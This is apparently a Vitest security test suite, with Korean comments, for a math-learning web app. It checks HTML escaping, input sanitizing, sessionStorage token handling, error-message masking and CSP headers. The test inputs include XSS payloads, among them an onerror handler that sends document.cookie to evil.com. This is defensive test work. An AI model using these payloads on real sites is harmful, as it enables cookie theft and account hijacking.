// 보안 패치 검증 테스트
import { describe, it, expect, beforeEach, vi } from 'vitest';

// ===== 1. XSS 방지 테스트 (DialogManager escapeHtml) =====
describe('XSS Prevention - escapeHtml', () => {
  // DialogManager 내부 escapeHtml 로직을 직접 테스트
  function escapeHtml(str) {
    if (typeof str !== 'string') return String(str ?? '');
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }

  it('should escape script tags', () => {
    const malicious = '<script>alert("xss")</script>';
    const result = escapeHtml(malicious);
    expect(result).not.toContain('<script>');
    expect(result).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
  });

  it('should escape HTML attributes breakout', () => {
    const malicious = '"><img src=x onerror=alert(1)>';
    const result = escapeHtml(malicious);
    // " 와 < > 가 이스케이프되어 HTML 속성 탈출 불가
    expect(result).not.toContain('<img');
    expect(result).not.toContain('"');
    expect(result).toContain('&quot;');
    expect(result).toContain('&lt;img');
    expect(result).toContain('&gt;');
  });

  it('should escape event handlers in attributes', () => {
    const malicious = "' onmouseover='alert(1)'";
    const result = escapeHtml(malicious);
    // ' 가 이스케이프되어 속성 값 탈출 불가
    expect(result).not.toContain("'");
    expect(result).toContain('&#039;');
  });

  it('should handle ampersands', () => {
    expect(escapeHtml('A & B')).toBe('A &amp; B');
  });

  it('should handle null/undefined/numbers', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml(42)).toBe('42');
  });

  it('should preserve safe text', () => {
    const safe = '수학 문제: 2x + 3 = 7 의 답은?';
    expect(escapeHtml(safe)).toBe(safe);
  });

  it('should handle mixed Korean and HTML', () => {
    const mixed = '정답은 <b>42</b>입니다';
    const result = escapeHtml(mixed);
    expect(result).toBe('정답은 &lt;b&gt;42&lt;/b&gt;입니다');
  });
});

// ===== 2. sessionStorage 보호 테스트 =====
describe('Secure Storage - sessionStorage', () => {
  let mockSessionStorage;
  let mockLocalStorage;

  beforeEach(() => {
    mockSessionStorage = {};
    mockLocalStorage = {};

    vi.stubGlobal('sessionStorage', {
      getItem: vi.fn((key) => mockSessionStorage[key] || null),
      setItem: vi.fn((key, val) => { mockSessionStorage[key] = val; }),
      removeItem: vi.fn((key) => { delete mockSessionStorage[key]; }),
    });
    vi.stubGlobal('localStorage', {
      getItem: vi.fn((key) => mockLocalStorage[key] || null),
      setItem: vi.fn((key, val) => { mockLocalStorage[key] = val; }),
      removeItem: vi.fn((key) => { delete mockLocalStorage[key]; }),
    });
  });

  it('secureSetItem should use sessionStorage not localStorage', async () => {
    const { secureSetItem } = await import('../../../src/utils/storage.js');
    secureSetItem('session_token', 'abc123');
    expect(sessionStorage.setItem).toHaveBeenCalledWith('session_token', 'abc123');
    expect(localStorage.setItem).not.toHaveBeenCalled();
  });

  it('secureGetItem should read from sessionStorage', async () => {
    const { secureGetItem } = await import('../../../src/utils/storage.js');
    mockSessionStorage['test_key'] = 'secret';
    const val = secureGetItem('test_key');
    expect(sessionStorage.getItem).toHaveBeenCalledWith('test_key');
    expect(val).toBe('secret');
  });

  it('secureRemoveItem should remove from sessionStorage', async () => {
    const { secureRemoveItem } = await import('../../../src/utils/storage.js');
    secureRemoveItem('session_token');
    expect(sessionStorage.removeItem).toHaveBeenCalledWith('session_token');
    expect(localStorage.removeItem).not.toHaveBeenCalled();
  });

  it('safeSetItem should still use localStorage for non-sensitive data', async () => {
    const { safeSetItem } = await import('../../../src/utils/storage.js');
    safeSetItem('sound_volume', '0.5');
    expect(localStorage.setItem).toHaveBeenCalledWith('sound_volume', '0.5');
    expect(sessionStorage.setItem).not.toHaveBeenCalled();
  });

  it('secureGetItem should return fallback on error', async () => {
    vi.stubGlobal('sessionStorage', {
      getItem: vi.fn(() => { throw new Error('Blocked'); }),
      setItem: vi.fn(),
      removeItem: vi.fn(),
    });
    const { secureGetItem } = await import('../../../src/utils/storage.js');
    expect(secureGetItem('key', 'default')).toBe('default');
  });
});

// ===== 3. 입력값 검증 테스트 =====
describe('Input Sanitization - RegisterManager', () => {
  // RegisterManager._sanitize 로직을 직접 테스트
  function sanitize(text, maxLen = 500) {
    if (typeof text !== 'string') return '';
    return text.replace(/<[^>]*>/g, '').trim().substring(0, maxLen);
  }

  function safeErrorMsg(err) {
    const msg = err?.message || '';
    return msg.replace(/https?:\/\/[^\s]+/g, '[URL]')
      .replace(/[A-Z]:\\[^\s]+/gi, '[path]')
      .replace(/\/[^\s]*\/[^\s]+/g, '[path]')
      .substring(0, 100);
  }

  it('should strip HTML tags', () => {
    expect(sanitize('<script>alert(1)</script>Hello')).toBe('alert(1)Hello');
    expect(sanitize('<b>bold</b> text')).toBe('bold text');
    expect(sanitize('<img src=x onerror=alert(1)>test')).toBe('test');
  });

  it('should enforce length limit', () => {
    const long = 'a'.repeat(2000);
    expect(sanitize(long, 1000)).toHaveLength(1000);
    expect(sanitize(long, 200)).toHaveLength(200);
  });

  it('should trim whitespace', () => {
    expect(sanitize('  hello  ')).toBe('hello');
    expect(sanitize('\n\ttabs\n\t')).toBe('tabs');
  });

  it('should handle non-string input', () => {
    expect(sanitize(null)).toBe('');
    expect(sanitize(undefined)).toBe('');
    expect(sanitize(123)).toBe('');
    expect(sanitize({})).toBe('');
  });

  it('should preserve math expressions', () => {
    expect(sanitize('2x + 3 = 7')).toBe('2x + 3 = 7');
    expect(sanitize('x² - 5x + 6 = 0')).toBe('x² - 5x + 6 = 0');
    expect(sanitize('1/2 + 1/3 = 5/6')).toBe('1/2 + 1/3 = 5/6');
  });

  it('should mask URLs in error messages', () => {
    const err = { message: 'Failed at https://api.example.com/v1/data' };
    const result = safeErrorMsg(err);
    expect(result).not.toContain('https://');
    expect(result).toContain('[URL]');
  });

  it('should mask file paths in error messages', () => {
    const err = { message: 'Error reading C:\\Users\\admin\\secret.txt' };
    const result = safeErrorMsg(err);
    expect(result).not.toContain('C:\\Users');
    expect(result).toContain('[path]');
  });

  it('should mask unix paths in error messages', () => {
    const err = { message: 'Cannot find /etc/secrets/config.json' };
    const result = safeErrorMsg(err);
    expect(result).not.toContain('/etc/secrets');
    expect(result).toContain('[path]');
  });

  it('should limit error message length', () => {
    const err = { message: 'x'.repeat(500) };
    expect(safeErrorMsg(err)).toHaveLength(100);
  });

  it('should handle null/undefined errors', () => {
    expect(safeErrorMsg(null)).toBe('');
    expect(safeErrorMsg(undefined)).toBe('');
    expect(safeErrorMsg({})).toBe('');
  });
});

// ===== 4. CSP 헤더 검증 테스트 =====
describe('CSP Header - index.html', () => {
  let htmlContent;

  beforeEach(async () => {
    const fs = await import('fs');
    const path = await import('path');
    htmlContent = fs.readFileSync(
      path.resolve(__dirname, '../../../index.html'), 'utf-8'
    );
  });

  it('should have Content-Security-Policy meta tag', () => {
    expect(htmlContent).toContain('Content-Security-Policy');
  });

  it('should restrict default-src to self', () => {
    expect(htmlContent).toContain("default-src 'self'");
  });

  it('should allow only whitelisted script sources', () => {
    expect(htmlContent).toContain("script-src 'self' https://cdn.jsdelivr.net https://accounts.google.com");
  });

  it('should block object/plugin embeds', () => {
    expect(htmlContent).toContain("object-src 'none'");
  });

  it('should restrict base-uri', () => {
    expect(htmlContent).toContain("base-uri 'self'");
  });

  it('should allow data: and blob: for images (camera capture)', () => {
    expect(htmlContent).toContain('img-src');
    expect(htmlContent).toContain('data:');
    expect(htmlContent).toContain('blob:');
  });

  it('should whitelist required API domains in connect-src', () => {
    expect(htmlContent).toContain('study-api.blueskyman1012.workers.dev');
    expect(htmlContent).toContain('generativelanguage.googleapis.com');
    expect(htmlContent).toContain('caricature-api-rust.wizice.com');
  });

  it('should not allow unsafe-eval in script-src', () => {
    const scriptSrcMatch = htmlContent.match(/script-src[^;]*/);
    expect(scriptSrcMatch).toBeTruthy();
    expect(scriptSrcMatch[0]).not.toContain('unsafe-eval');
  });

  it('should not allow unsafe-inline in script-src', () => {
    const scriptSrcMatch = htmlContent.match(/script-src[^;]*/);
    expect(scriptSrcMatch).toBeTruthy();
    expect(scriptSrcMatch[0]).not.toContain('unsafe-inline');
  });
});

// ===== 5. 통합 보안 시나리오 테스트 =====
describe('Security Integration Scenarios', () => {
  function escapeHtml(str) {
    if (typeof str !== 'string') return String(str ?? '');
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }

  function sanitize(text, maxLen = 500) {
    if (typeof text !== 'string') return '';
    return text.replace(/<[^>]*>/g, '').trim().substring(0, maxLen);
  }

  it('AI 응답에 스크립트 삽입 시 안전하게 처리', () => {
    const aiResponse = '문제: <script>document.cookie</script>2x+3=7';
    // sanitize removes tags, escapeHtml encodes them
    const sanitized = sanitize(aiResponse);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toBe('문제: document.cookie2x+3=7');

    const escaped = escapeHtml(aiResponse);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('사용자 입력으로 속성 탈출 시도 시 차단', () => {
    const input = '" onfocus="alert(document.cookie)" autofocus="';
    const escaped = escapeHtml(input);
    // " 가 이스케이프되어 속성 탈출 불가
    expect(escaped).not.toContain('"');
    expect(escaped).toContain('&quot;');
  });

  it('이미지 태그 인젝션 시도 차단', () => {
    const input = '<img src="x" onerror="fetch(\'https://evil.com?c=\'+document.cookie)">';
    const sanitized = sanitize(input);
    expect(sanitized).not.toContain('<img');
    expect(sanitized).not.toContain('onerror');
  });

  it('초과 길이 입력으로 DoS 시도 차단', () => {
    const huge = '가'.repeat(100000);
    const sanitized = sanitize(huge, 1000);
    expect(sanitized).toHaveLength(1000);
  });

  it('민감 데이터가 localStorage에 없어야 함 (sessionStorage 사용)', async () => {
    const mockSessionStorage = {};
    const mockLocalStorage = {};

    vi.stubGlobal('sessionStorage', {
      getItem: vi.fn((key) => mockSessionStorage[key] || null),
      setItem: vi.fn((key, val) => { mockSessionStorage[key] = val; }),
      removeItem: vi.fn((key) => { delete mockSessionStorage[key]; }),
    });
    vi.stubGlobal('localStorage', {
      getItem: vi.fn((key) => mockLocalStorage[key] || null),
      setItem: vi.fn((key, val) => { mockLocalStorage[key] = val; }),
      removeItem: vi.fn((key) => { delete mockLocalStorage[key]; }),
    });

    const { secureSetItem } = await import('../../../src/utils/storage.js');
    secureSetItem('session_token', 'my_secret_token');

    // sessionStorage에 저장되고 localStorage에는 없어야 함
    expect(sessionStorage.setItem).toHaveBeenCalledWith('session_token', 'my_secret_token');
    expect(localStorage.setItem).not.toHaveBeenCalledWith('session_token', expect.anything());
  });
});
